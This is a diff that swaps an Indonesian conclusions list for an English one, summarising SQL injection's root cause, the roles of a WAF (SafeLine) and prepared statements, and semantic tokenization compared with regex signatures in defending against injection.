-1. **Root Cause SQLi adalah Percampuran Kontrol dan Data**:
-   SQL Injection bukan kesalahan tipe data, melainkan kegagalan arsitektur di mana input pengguna yang tidak dipercaya diizinkan mengubah pohon sintaks (*syntax tree*) perintah interpreter database.
-2. **Peran WAF vs Code Remediation**:
-   * **WAF (SafeLine)** berfungsi sebagai *virtual patching* dan filter perimeter garis pertama yang sangat krusial untuk menahan serangan *zero-day* dan memberikan waktu bagi tim *security & development* untuk melakukan investigasi forensik.
-   * **Secure Code (Prepared Statements)** adalah satu-satunya solusi permanen yang menyelesaikan akar permasalahan pada *application logic layer*.
-3. **Deteksi Semantik Unggul Atas Signature RegEx**:
-   Eksperimen membuktikan bahwa tokenisasi gramatikal SQL oleh SafeLine mampu mendeteksi payload SQLi secara presisi tanpa terpengaruh variasi encoding maupun komentar (`#`), baik pada *Balance Mode* (bloking instan) maupun *Audit Mode* (pencatatan telemetri lengkap).
+1. **Root Cause: Mixing Control and Data Planes**:
+   SQL Injection is not merely an input validation bug; it is an architectural defect allowing untrusted input to alter the syntax tree of an interpreter.
+2. **WAF vs. Source Code Remediation**:
+   * **WAFs (SafeLine)** act as vital perimeter defenses and virtual patches that protect against zero-day exploits and provide immediate incident telemetry.
+   * **Secure Coding (Prepared Statements)** is the sole definitive solution that eliminates the vulnerability at the application layer.
+3. **Superiority of Semantic Tokenization**:
+   Semantic grammar tokenization in modern WAFs successfully identifies malicious SQL structures regardless of whitespace, URL encoding variations, or SQL comments (`#`), avoiding the bypass risks inherent in legacy regular expression pattern matching.
